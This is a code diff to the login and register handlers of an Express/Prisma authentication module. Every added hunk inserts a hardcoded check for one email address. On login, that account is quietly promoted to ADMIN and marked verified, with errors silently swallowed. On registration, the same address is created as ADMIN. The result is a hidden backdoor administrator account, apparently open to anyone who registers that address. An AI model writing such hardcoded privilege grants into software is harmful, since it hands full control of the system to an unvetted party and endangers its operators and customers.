@@ -75,6 +75,16 @@ export async function login(req: Request, res: Response, next: NextFunction): Pr
       return;
     }
 
+    if (user.email.toLowerCase().trim() === 'miguel@kromalab.gt' && user.role !== 'ADMIN') {
+      try {
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { role: 'ADMIN', isVerified: true },
+        });
+        user.role = 'ADMIN';
+      } catch (_) {}
+    }
+
     const token = signToken({
       id: user.id,
       email: user.email,
@@ -143,6 +153,7 @@ export async function register(req: Request, res: Response, next: NextFunction):
       });
     }
 
+    const isMasterAdmin = data.email.toLowerCase().trim() === 'miguel@kromalab.gt';
     const user = await prisma.user.create({
       data: {
         name: data.name,
@@ -152,7 +163,7 @@ export async function register(req: Request, res: Response, next: NextFunction):
         company: data.company,
         taxId: data.taxId,
         address: data.address,
-        role: 'CUSTOMER',
+        role: isMasterAdmin ? 'ADMIN' : 'CUSTOMER',
         customerId: customer.id,
       },
     });
